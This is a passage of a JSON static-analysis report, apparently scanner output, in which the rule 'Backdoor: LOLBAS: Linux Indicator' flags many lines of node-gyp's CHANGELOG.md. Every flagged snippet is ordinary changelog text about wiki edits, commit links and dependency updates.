                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 42,
                  "endLine": 435,
                  "endColumn": 48,
                  "snippet": {
                    "text": "4854](https://www.github.com/nodejs/node-gyp/commit/d31485415ef69d46effa6090c95698341965de1b))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([11858b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([33561e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([4a7f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Up",
                    "rendered": {
                      "text": "4854](https://www.github.com/nodejs/node-gyp/commit/d31485415ef69d46effa6090c95698341965de1b))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([11858b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([33561e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([4a7f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Up",
                      "markdown": "`4854](https://www.github.com/nodejs/node-gyp/commit/d31485415ef69d46effa6090c95698341965de1b))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([11858b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([33561e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([4a7f2d0](https://www.github.com/nodejs/node-gyp/commit/4a7f2d0d869a65c99a78504976567017edadf657))\n* **wiki:** Updated Up`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 434,
                  "startColumn": 42,
                  "endLine": 434,
                  "endColumn": 48,
                  "snippet": {
                    "text": "68bb](https://www.github.com/nodejs/node-gyp/commit/59668bb0b904feccf3c09afa2fd37378c77af967))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([d314854](https://www.github.com/nodejs/node-gyp/commit/d31485415ef69d46effa6090c95698341965de1b))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([11858b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([33561e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Up",
                    "rendered": {
                      "text": "68bb](https://www.github.com/nodejs/node-gyp/commit/59668bb0b904feccf3c09afa2fd37378c77af967))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([d314854](https://www.github.com/nodejs/node-gyp/commit/d31485415ef69d46effa6090c95698341965de1b))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([11858b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([33561e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Up",
                      "markdown": "`68bb](https://www.github.com/nodejs/node-gyp/commit/59668bb0b904feccf3c09afa2fd37378c77af967))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([d314854](https://www.github.com/nodejs/node-gyp/commit/d31485415ef69d46effa6090c95698341965de1b))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([11858b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([33561e9](https://www.github.com/nodejs/node-gyp/commit/33561e9cbf5f4eb46111318503c77df2c6eb484a))\n* **wiki:** Updated Up`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 433,
                  "startColumn": 42,
                  "endLine": 433,
                  "endColumn": 48,
                  "snippet": {
                    "text": "7](https://www.github.com/nodejs/node-gyp/commit/c00eb778fc7dc27e4dab3a9219035ea20458b33b))\n* **wiki:** Updated node-levelup to node-leveldown (broken links) ([59668bb](https://www.github.com/nodejs/node-gyp/commit/59668bb0b904feccf3c09afa2fd37378c77af967))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([d314854](https://www.github.com/nodejs/node-gyp/commit/d31485415ef69d46effa6090c95698341965de1b))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([11858b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Up",
                    "rendered": {
                      "text": "7](https://www.github.com/nodejs/node-gyp/commit/c00eb778fc7dc27e4dab3a9219035ea20458b33b))\n* **wiki:** Updated node-levelup to node-leveldown (broken links) ([59668bb](https://www.github.com/nodejs/node-gyp/commit/59668bb0b904feccf3c09afa2fd37378c77af967))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([d314854](https://www.github.com/nodejs/node-gyp/commit/d31485415ef69d46effa6090c95698341965de1b))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([11858b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Up",
                      "markdown": "`7](https://www.github.com/nodejs/node-gyp/commit/c00eb778fc7dc27e4dab3a9219035ea20458b33b))\n* **wiki:** Updated node-levelup to node-leveldown (broken links) ([59668bb](https://www.github.com/nodejs/node-gyp/commit/59668bb0b904feccf3c09afa2fd37378c77af967))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([d314854](https://www.github.com/nodejs/node-gyp/commit/d31485415ef69d46effa6090c95698341965de1b))\n* **wiki:** Updated Updating npm's bundled node gyp (markdown) ([11858b0](https://www.github.com/nodejs/node-gyp/commit/11858b0655d1eee00c62ad628e719d4378803d14))\n* **wiki:** Updated Up`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 431,
                  "startColumn": 30,
                  "endLine": 431,
                  "endColumn": 39,
                  "snippet": {
                    "text": "ted Home (markdown) ([b398ef4](https://www.github.com/nodejs/node-gyp/commit/b398ef46f660d2b1506508550dadfb4c35639e4b))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([8919028](https://www.github.com/nodejs/node-gyp/commit/8919028921fd304f08044098434f0dc6071fb7cf))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([c00eb77](https://www.github.com/nodejs/node-gyp/commit/c00eb778fc7dc27e4dab3a9219035ea20458b33b))\n* **wiki:** Updated node-levelup to node-leveldown (broken links) ([59668bb](https://www.github.com/nodejs/node-gyp/commit/59668bb0b904feccf3c09afa2fd37378c77af967))\n* **wiki:** Updated Upd",
                    "rendered": {
                      "text": "ted Home (markdown) ([b398ef4](https://www.github.com/nodejs/node-gyp/commit/b398ef46f660d2b1506508550dadfb4c35639e4b))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([8919028](https://www.github.com/nodejs/node-gyp/commit/8919028921fd304f08044098434f0dc6071fb7cf))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([c00eb77](https://www.github.com/nodejs/node-gyp/commit/c00eb778fc7dc27e4dab3a9219035ea20458b33b))\n* **wiki:** Updated node-levelup to node-leveldown (broken links) ([59668bb](https://www.github.com/nodejs/node-gyp/commit/59668bb0b904feccf3c09afa2fd37378c77af967))\n* **wiki:** Updated Upd",
                      "markdown": "`ted Home (markdown) ([b398ef4](https://www.github.com/nodejs/node-gyp/commit/b398ef46f660d2b1506508550dadfb4c35639e4b))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([8919028](https://www.github.com/nodejs/node-gyp/commit/8919028921fd304f08044098434f0dc6071fb7cf))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([c00eb77](https://www.github.com/nodejs/node-gyp/commit/c00eb778fc7dc27e4dab3a9219035ea20458b33b))\n* **wiki:** Updated node-levelup to node-leveldown (broken links) ([59668bb](https://www.github.com/nodejs/node-gyp/commit/59668bb0b904feccf3c09afa2fd37378c77af967))\n* **wiki:** Updated Upd`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 430,
                  "startColumn": 30,
                  "endLine": 430,
                  "endColumn": 39,
                  "snippet": {
                    "text": "**wiki:** Updated Home (markdown) ([0e37ff4](https://www.github.com/nodejs/node-gyp/commit/0e37ff48b306c12149661b375895741d3d710da7))\n* **wiki:** Updated Home (markdown) ([b398ef4](https://www.github.com/nodejs/node-gyp/commit/b398ef46f660d2b1506508550dadfb4c35639e4b))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([8919028](https://www.github.com/nodejs/node-gyp/commit/8919028921fd304f08044098434f0dc6071fb7cf))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([c00eb77](https://www.github.com/nodejs/node-gyp/commit/c00eb778fc7dc27e4dab3a9219035ea20458b33b))\n* **wiki:** Updated node-levelup to nod",
                    "rendered": {
                      "text": "**wiki:** Updated Home (markdown) ([0e37ff4](https://www.github.com/nodejs/node-gyp/commit/0e37ff48b306c12149661b375895741d3d710da7))\n* **wiki:** Updated Home (markdown) ([b398ef4](https://www.github.com/nodejs/node-gyp/commit/b398ef46f660d2b1506508550dadfb4c35639e4b))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([8919028](https://www.github.com/nodejs/node-gyp/commit/8919028921fd304f08044098434f0dc6071fb7cf))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([c00eb77](https://www.github.com/nodejs/node-gyp/commit/c00eb778fc7dc27e4dab3a9219035ea20458b33b))\n* **wiki:** Updated node-levelup to nod",
                      "markdown": "`**wiki:** Updated Home (markdown) ([0e37ff4](https://www.github.com/nodejs/node-gyp/commit/0e37ff48b306c12149661b375895741d3d710da7))\n* **wiki:** Updated Home (markdown) ([b398ef4](https://www.github.com/nodejs/node-gyp/commit/b398ef46f660d2b1506508550dadfb4c35639e4b))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([8919028](https://www.github.com/nodejs/node-gyp/commit/8919028921fd304f08044098434f0dc6071fb7cf))\n* **wiki:** Updated Linking to OpenSSL (markdown) ([c00eb77](https://www.github.com/nodejs/node-gyp/commit/c00eb778fc7dc27e4dab3a9219035ea20458b33b))\n* **wiki:** Updated node-levelup to nod`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 423,
                  "startColumn": 44,
                  "endLine": 423,
                  "endColumn": 50,
                  "snippet": {
                    "text": "https://www.github.com/nodejs/node-gyp/commit/27658913e6220cf0371b4b73e25a0e4ab11108a1))\n* **wiki:** Updated \"binding.gyp\" files out in the wild (markdown) ([dc97766](https://www.github.com/nodejs/node-gyp/commit/dc9776648d432bca6775c176641f16da14522d4c))\n* **wiki:** Updated Error: \"pre\" versions of node cannot be installed (markdown) ([e9f8b33](https://www.github.com/nodejs/node-gyp/commit/e9f8b33d1f87d04f22cb09a814d7c55d0fa38446))\n* **wiki:** Updated Home (markdown) ([3407109](https://www.github.com/nodejs/node-gyp/commit/3407109325cf7ba1e925656b9eb75feffab0557c))\n* **wiki:** Updated Home (markdow",
                    "rendered": {
                      "text": "https://www.github.com/nodejs/node-gyp/commit/27658913e6220cf0371b4b73e25a0e4ab11108a1))\n* **wiki:** Updated \"binding.gyp\" files out in the wild (markdown) ([dc97766](https://www.github.com/nodejs/node-gyp/commit/dc9776648d432bca6775c176641f16da14522d4c))\n* **wiki:** Updated Error: \"pre\" versions of node cannot be installed (markdown) ([e9f8b33](https://www.github.com/nodejs/node-gyp/commit/e9f8b33d1f87d04f22cb09a814d7c55d0fa38446))\n* **wiki:** Updated Home (markdown) ([3407109](https://www.github.com/nodejs/node-gyp/commit/3407109325cf7ba1e925656b9eb75feffab0557c))\n* **wiki:** Updated Home (markdow",
                      "markdown": "`https://www.github.com/nodejs/node-gyp/commit/27658913e6220cf0371b4b73e25a0e4ab11108a1))\n* **wiki:** Updated \"binding.gyp\" files out in the wild (markdown) ([dc97766](https://www.github.com/nodejs/node-gyp/commit/dc9776648d432bca6775c176641f16da14522d4c))\n* **wiki:** Updated Error: \"pre\" versions of node cannot be installed (markdown) ([e9f8b33](https://www.github.com/nodejs/node-gyp/commit/e9f8b33d1f87d04f22cb09a814d7c55d0fa38446))\n* **wiki:** Updated Home (markdown) ([3407109](https://www.github.com/nodejs/node-gyp/commit/3407109325cf7ba1e925656b9eb75feffab0557c))\n* **wiki:** Updated Home (markdow`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 379,
                  "startColumn": 42,
                  "endLine": 379,
                  "endColumn": 48,
                  "snippet": {
                    "text": "rkdown) ([98bc80d](https://www.github.com/nodejs/node-gyp/commit/98bc80d7a62ba70c881f3c39d94f804322e57852))\n* **wiki:** Created Linking to OpenSSL (markdown) ([c46d00d](https://www.github.com/nodejs/node-gyp/commit/c46d00d83bac5173dea8bbbb175a1a7de74fdaca))\n* **wiki:** Created Updating npm's bundled node gyp (markdown) ([e0ac8d1](https://www.github.com/nodejs/node-gyp/commit/e0ac8d15af46aadd1c220599e63199b154a514e6))\n* **wiki:** Created use of undeclared identifier 'TypedArray' (markdown) ([65ba711](https://www.github.com/nodejs/node-gyp/commit/65ba71139e9b7f64ac823e575ee9dbf17d937ce4))\n* **wiki:** ",
                    "rendered": {
                      "text": "rkdown) ([98bc80d](https://www.github.com/nodejs/node-gyp/commit/98bc80d7a62ba70c881f3c39d94f804322e57852))\n* **wiki:** Created Linking to OpenSSL (markdown) ([c46d00d](https://www.github.com/nodejs/node-gyp/commit/c46d00d83bac5173dea8bbbb175a1a7de74fdaca))\n* **wiki:** Created Updating npm's bundled node gyp (markdown) ([e0ac8d1](https://www.github.com/nodejs/node-gyp/commit/e0ac8d15af46aadd1c220599e63199b154a514e6))\n* **wiki:** Created use of undeclared identifier 'TypedArray' (markdown) ([65ba711](https://www.github.com/nodejs/node-gyp/commit/65ba71139e9b7f64ac823e575ee9dbf17d937ce4))\n* **wiki:** ",
                      "markdown": "`rkdown) ([98bc80d](https://www.github.com/nodejs/node-gyp/commit/98bc80d7a62ba70c881f3c39d94f804322e57852))\n* **wiki:** Created Linking to OpenSSL (markdown) ([c46d00d](https://www.github.com/nodejs/node-gyp/commit/c46d00d83bac5173dea8bbbb175a1a7de74fdaca))\n* **wiki:** Created Updating npm's bundled node gyp (markdown) ([e0ac8d1](https://www.github.com/nodejs/node-gyp/commit/e0ac8d15af46aadd1c220599e63199b154a514e6))\n* **wiki:** Created use of undeclared identifier 'TypedArray' (markdown) ([65ba711](https://www.github.com/nodejs/node-gyp/commit/65ba71139e9b7f64ac823e575ee9dbf17d937ce4))\n* **wiki:** `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 378,
                  "startColumn": 30,
                  "endLine": 378,
                  "endColumn": 39,
                  "snippet": {
                    "text": "https://www.github.com/nodejs/node-gyp/commit/a38299ea340ceb0e732c6dc6a1b4760257644839))\n* **wiki:** Created Error: \"pre\" versions of node cannot be installed (markdown) ([98bc80d](https://www.github.com/nodejs/node-gyp/commit/98bc80d7a62ba70c881f3c39d94f804322e57852))\n* **wiki:** Created Linking to OpenSSL (markdown) ([c46d00d](https://www.github.com/nodejs/node-gyp/commit/c46d00d83bac5173dea8bbbb175a1a7de74fdaca))\n* **wiki:** Created Updating npm's bundled node gyp (markdown) ([e0ac8d1](https://www.github.com/nodejs/node-gyp/commit/e0ac8d15af46aadd1c220599e63199b154a514e6))\n* **wiki:** Created use of",
                    "rendered": {
                      "text": "https://www.github.com/nodejs/node-gyp/commit/a38299ea340ceb0e732c6dc6a1b4760257644839))\n* **wiki:** Created Error: \"pre\" versions of node cannot be installed (markdown) ([98bc80d](https://www.github.com/nodejs/node-gyp/commit/98bc80d7a62ba70c881f3c39d94f804322e57852))\n* **wiki:** Created Linking to OpenSSL (markdown) ([c46d00d](https://www.github.com/nodejs/node-gyp/commit/c46d00d83bac5173dea8bbbb175a1a7de74fdaca))\n* **wiki:** Created Updating npm's bundled node gyp (markdown) ([e0ac8d1](https://www.github.com/nodejs/node-gyp/commit/e0ac8d15af46aadd1c220599e63199b154a514e6))\n* **wiki:** Created use of",
                      "markdown": "`https://www.github.com/nodejs/node-gyp/commit/a38299ea340ceb0e732c6dc6a1b4760257644839))\n* **wiki:** Created Error: \"pre\" versions of node cannot be installed (markdown) ([98bc80d](https://www.github.com/nodejs/node-gyp/commit/98bc80d7a62ba70c881f3c39d94f804322e57852))\n* **wiki:** Created Linking to OpenSSL (markdown) ([c46d00d](https://www.github.com/nodejs/node-gyp/commit/c46d00d83bac5173dea8bbbb175a1a7de74fdaca))\n* **wiki:** Created Updating npm's bundled node gyp (markdown) ([e0ac8d1](https://www.github.com/nodejs/node-gyp/commit/e0ac8d15af46aadd1c220599e63199b154a514e6))\n* **wiki:** Created use of`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 377,
                  "startColumn": 44,
                  "endLine": 377,
                  "endColumn": 50,
                  "snippet": {
                    "text": "(markdown) ([d4fd143](https://www.github.com/nodejs/node-gyp/commit/d4fd14355bbe57f229f082f47bb2b3670868203f))\n* **wiki:** Created Common issues (markdown) ([a38299e](https://www.github.com/nodejs/node-gyp/commit/a38299ea340ceb0e732c6dc6a1b4760257644839))\n* **wiki:** Created Error: \"pre\" versions of node cannot be installed (markdown) ([98bc80d](https://www.github.com/nodejs/node-gyp/commit/98bc80d7a62ba70c881f3c39d94f804322e57852))\n* **wiki:** Created Linking to OpenSSL (markdown) ([c46d00d](https://www.github.com/nodejs/node-gyp/commit/c46d00d83bac5173dea8bbbb175a1a7de74fdaca))\n* **wiki:** Created",
                    "rendered": {
                      "text": "(markdown) ([d4fd143](https://www.github.com/nodejs/node-gyp/commit/d4fd14355bbe57f229f082f47bb2b3670868203f))\n* **wiki:** Created Common issues (markdown) ([a38299e](https://www.github.com/nodejs/node-gyp/commit/a38299ea340ceb0e732c6dc6a1b4760257644839))\n* **wiki:** Created Error: \"pre\" versions of node cannot be installed (markdown) ([98bc80d](https://www.github.com/nodejs/node-gyp/commit/98bc80d7a62ba70c881f3c39d94f804322e57852))\n* **wiki:** Created Linking to OpenSSL (markdown) ([c46d00d](https://www.github.com/nodejs/node-gyp/commit/c46d00d83bac5173dea8bbbb175a1a7de74fdaca))\n* **wiki:** Created",
                      "markdown": "`(markdown) ([d4fd143](https://www.github.com/nodejs/node-gyp/commit/d4fd14355bbe57f229f082f47bb2b3670868203f))\n* **wiki:** Created Common issues (markdown) ([a38299e](https://www.github.com/nodejs/node-gyp/commit/a38299ea340ceb0e732c6dc6a1b4760257644839))\n* **wiki:** Created Error: \"pre\" versions of node cannot be installed (markdown) ([98bc80d](https://www.github.com/nodejs/node-gyp/commit/98bc80d7a62ba70c881f3c39d94f804322e57852))\n* **wiki:** Created Linking to OpenSSL (markdown) ([c46d00d](https://www.github.com/nodejs/node-gyp/commit/c46d00d83bac5173dea8bbbb175a1a7de74fdaca))\n* **wiki:** Created`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 344,
                  "startColumn": 16,
                  "endLine": 344,
                  "endColumn": 21,
                  "snippet": {
                    "text": "t/f0882b1264b2fa701adbc81a3be0b3cba80e333d))\n\n\n### Core\n\n* deep-copy process.config during configure ([#2368](https://www.github.com/nodejs/node-gyp/issues/2368)) ([5f1a06c](https://www.github.com/nodejs/node-gyp/commit/5f1a06c50f3b0c3d292f64948f85a004cfcc5c87))\n\n\n### Miscellaneous\n\n* **deps:** bump tar from 6.1.0 to 6.1.2 ([#2474](https://www.github.com/nodejs/node-gyp/issues/2474)) ([ec15a3e](https://www.github.com/nodejs/node-gyp/commit/ec15a3e5012004172713c11eebcc9d852d32d380))\n* fix typos discovered by codespell ([#2442](https://www.github.com/nodejs/node-gyp/issues/2442)) ([2d0ce55](https://w",
                    "rendered": {
                      "text": "t/f0882b1264b2fa701adbc81a3be0b3cba80e333d))\n\n\n### Core\n\n* deep-copy process.config during configure ([#2368](https://www.github.com/nodejs/node-gyp/issues/2368)) ([5f1a06c](https://www.github.com/nodejs/node-gyp/commit/5f1a06c50f3b0c3d292f64948f85a004cfcc5c87))\n\n\n### Miscellaneous\n\n* **deps:** bump tar from 6.1.0 to 6.1.2 ([#2474](https://www.github.com/nodejs/node-gyp/issues/2474)) ([ec15a3e](https://www.github.com/nodejs/node-gyp/commit/ec15a3e5012004172713c11eebcc9d852d32d380))\n* fix typos discovered by codespell ([#2442](https://www.github.com/nodejs/node-gyp/issues/2442)) ([2d0ce55](https://w",
                      "markdown": "`t/f0882b1264b2fa701adbc81a3be0b3cba80e333d))\n\n\n### Core\n\n* deep-copy process.config during configure ([#2368](https://www.github.com/nodejs/node-gyp/issues/2368)) ([5f1a06c](https://www.github.com/nodejs/node-gyp/commit/5f1a06c50f3b0c3d292f64948f85a004cfcc5c87))\n\n\n### Miscellaneous\n\n* **deps:** bump tar from 6.1.0 to 6.1.2 ([#2474](https://www.github.com/nodejs/node-gyp/issues/2474)) ([ec15a3e](https://www.github.com/nodejs/node-gyp/commit/ec15a3e5012004172713c11eebcc9d852d32d380))\n* fix typos discovered by codespell ([#2442](https://www.github.com/nodejs/node-gyp/issues/2442)) ([2d0ce55](https://w`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 300,
                  "startColumn": 29,
                  "endLine": 300,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n### Features\n\n* build with config.gypi from node headers ([a27dc08](https://www.github.com/nodejs/node-gyp/commit/a27dc08696911c6d81e76cc228697243069103c1))\n* support vs2022 ([#2533](https://www.github.com/nodejs/node-gyp/issues/2533)) ([5a00387](https://www.github.com/nodejs/node-gyp/commit/5a00387e5f8018264a1822f6c4d5dbf425f21cf6))\n\n## [8.3.0](https://www.github.com/nodejs/node-gyp/compare/v8.2.0...v8.3.0) (2021-10-11)\n",
                    "rendered": {
                      "text": "\n### Features\n\n* build with config.gypi from node headers ([a27dc08](https://www.github.com/nodejs/node-gyp/commit/a27dc08696911c6d81e76cc228697243069103c1))\n* support vs2022 ([#2533](https://www.github.com/nodejs/node-gyp/issues/2533)) ([5a00387](https://www.github.com/nodejs/node-gyp/commit/5a00387e5f8018264a1822f6c4d5dbf425f21cf6))\n\n## [8.3.0](https://www.github.com/nodejs/node-gyp/compare/v8.2.0...v8.3.0) (2021-10-11)\n",
                      "markdown": "`\n### Features\n\n* build with config.gypi from node headers ([a27dc08](https://www.github.com/nodejs/node-gyp/commit/a27dc08696911c6d81e76cc228697243069103c1))\n* support vs2022 ([#2533](https://www.github.com/nodejs/node-gyp/issues/2533)) ([5a00387](https://www.github.com/nodejs/node-gyp/commit/5a00387e5f8018264a1822f6c4d5dbf425f21cf6))\n\n## [8.3.0](https://www.github.com/nodejs/node-gyp/compare/v8.2.0...v8.3.0) (2021-10-11)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 254,
                  "startColumn": 18,
                  "endLine": 254,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n### Bug Fixes\n\n* _ in npm_config_ env variables ([eef4eef](https://www.github.com/nodejs/node-gyp/commit/eef4eefccb13ff6a32db862709ee5b2d4edf7e95))\n* update make-fetch-happen to a minimum of 10.0.3 ([839e414](https://www.github.com/nodejs/node-gyp/commit/839e414b63790c815a4a370d0feee8f24a94d40f))\n\n\n",
                    "rendered": {
                      "text": "\n### Bug Fixes\n\n* _ in npm_config_ env variables ([eef4eef](https://www.github.com/nodejs/node-gyp/commit/eef4eefccb13ff6a32db862709ee5b2d4edf7e95))\n* update make-fetch-happen to a minimum of 10.0.3 ([839e414](https://www.github.com/nodejs/node-gyp/commit/839e414b63790c815a4a370d0feee8f24a94d40f))\n\n\n",
                      "markdown": "`\n### Bug Fixes\n\n* _ in npm_config_ env variables ([eef4eef](https://www.github.com/nodejs/node-gyp/commit/eef4eefccb13ff6a32db862709ee5b2d4edf7e95))\n* update make-fetch-happen to a minimum of 10.0.3 ([839e414](https://www.github.com/nodejs/node-gyp/commit/839e414b63790c815a4a370d0feee8f24a94d40f))\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 12,
